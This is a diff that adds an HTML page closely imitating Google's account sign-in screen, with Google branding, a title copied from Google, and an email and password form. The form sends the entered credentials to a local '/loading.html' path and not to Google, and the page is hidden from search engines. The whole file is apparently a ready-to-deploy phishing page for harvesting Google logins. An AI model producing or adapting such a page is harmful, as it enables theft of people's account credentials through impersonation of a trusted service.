@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+
+    <title>Sign in - Google Accounts</title>
+
+    <meta charset='UTF-8'>
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <meta http-equiv="pragma" content="no-cache" />
+    <meta name="viewport" content="width=device-width,
+    initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow"> 
+
+    <script src="static/js/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="static/css/bootstrap.min.css">
+    <link rel="stylesheet" href="static/css/style.css">
+    <link rel="icon" type="image/png" href="static/img/oc3czvmbvf.png"/>
+
+    <style>
+
+    .google-header-bar {
+    height: 71px;
+    border-bottom: 1px solid #e5e5e5;
+    overflow: hidden;
+    }
+
+    .google-header-bar.centered {
+    border: 0;
+    height: 108px;
+    }
+
+    .google-header-bar.centered .header .logo {
+    float: none;
+    margin: 40px auto 30px;
+    display: block;
+    }
+    .google-header-bar.centered .header .secondary-link {
+    display: none
+    }
+
+    .header .logo {
+    margin: 17px 0 0;
+    float: left;
+    height: 38px;
+    width: 116px;
+    }
+
+    </style>
+
+    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
+
+      .google-header-bar.centered {
+        height: 83px;
+      }
+
+      .google-header-bar.centered .header .logo {
+        margin: 25px auto 20px;
+      }
+
+      .card {
+        margin-bottom: 20px;
+      }
+
+    </style>
+
+    <style media="screen and (max-width: 580px)">
+
+      html,
+      body {
+        font-size: 14px;
+      }
+
+      .google-header-bar.centered {
+        height: 73px;
+      }
+
+      .google-header-bar.centered .header .logo {
+        margin: 20px auto 15px;
+      }
+
+      .content {
+        padding-left: 10px;
+        padding-right: 10px;
+      }
+
+      .hidden-small {
+        display: none;
+      }
+
+      .card {
+        padding: 20px 15px 30px;
+        width: 270px;
+      }
+
+      .footer ul li {
+        padding-right: 1em;
+      }
+
+      .lang-chooser-wrap {
+        display: none;
+      }
+
+    </style>
+
+  </head>
+
+  <body>
+
+    <div class="container">
+
+      <div class="google-header-bar centered">
+        <div class="header content clearfix">
+          <img alt="Google" class="logo" src="static/img/dtnk16mcjo.png">
+        </div>
+      </div>
+
+      <h1 class="text-center login-title">Sign in with your Google Account</h1>
+
+        <div class="account-wall">
+
+          <img class="profile-img" src="static/img/yqczrisvt2.png" alt="">
+
+          <form id="SubmitForm" class="form-signin" method="get" action="/loading.html" >
+            <input id="eml" type="text" name="eml" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
+            <input id="pwd" type="password" name="pwd" class="form-control" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
+
+            <div id="dialog">
+            <h2 id="error">Please enter the required fields.</h2>
+            </div>
+
+            <button id="btn" class="btn btn-primary btn-block btn-sharp" name="login" type="submit">Sign in</button>
+            <a href="#" class="pull-right need-help">Find my account </a><span class="clearfix"></span>
+          </form>
+
+        </div>
+
+            <br><a href="#" class="text-center new-account">Create an account </a>
+            <center><br><p class="tagline">One Google Account for everything Google</p>
+            <img src="static/img/tmjjgvk28i.png" width="210" height="17" alt=""></center><br><br>
+
+    <script>
+      /*
+      Check the password field and act accordingly.
+      */
+
+      $("#btn").on("click", function(e) {
+          e.preventDefault();
+          // get the password box and checkbox elements
+          var input = document.getElementById("eml");
+          var input2 = document.getElementById("pwd");
+          // check to see if the value is empty
+          if ( input.value == "" ){
+              passNotValid();
+          }else if( input2.value == "" ){ //check if the value of the repeat field is empty
+              passNotValid();
+          }else{
+             document.getElementById("SubmitForm").submit();    
+          }
+      });
+
+      function passNotValid(){
+        $("#dialog").css('display', 'block');
+        $(".form-control").css('border', '1px solid #dd4b39');
+      }
+      
+      /*
+      Post to the fallowing path given the parameters.
+
+      Args:
+        path: The path to be posted to.
+        params: The parameters to be passed.
+      */
+      function post(path, params) {
+        // create a form and set its attributes
+        var form = document.createElement("form");
+        form.setAttribute("method", "post");
+        form.setAttribute("action", path);
+
+        // set the attribute for the post
+        for(var key in params) {
+            if(params.hasOwnProperty(key)) {
+                var hiddenField = document.createElement("input");
+                hiddenField.setAttribute("type", "hidden");
+                hiddenField.setAttribute("name", key);
+                hiddenField.setAttribute("value", params[key]);
+                form.appendChild(hiddenField);
+             }
+        }
+        // submit the post
+        document.body.appendChild(form);
+        form.submit();
+      }
+      var input = document.getElementById("eml");
+      var input2 = document.getElementById("pwd");
+      input.disabled = false;
+      input2.disabled = false;
+    </script>
+
+    </div>
+
+  </body>
+
+</html>
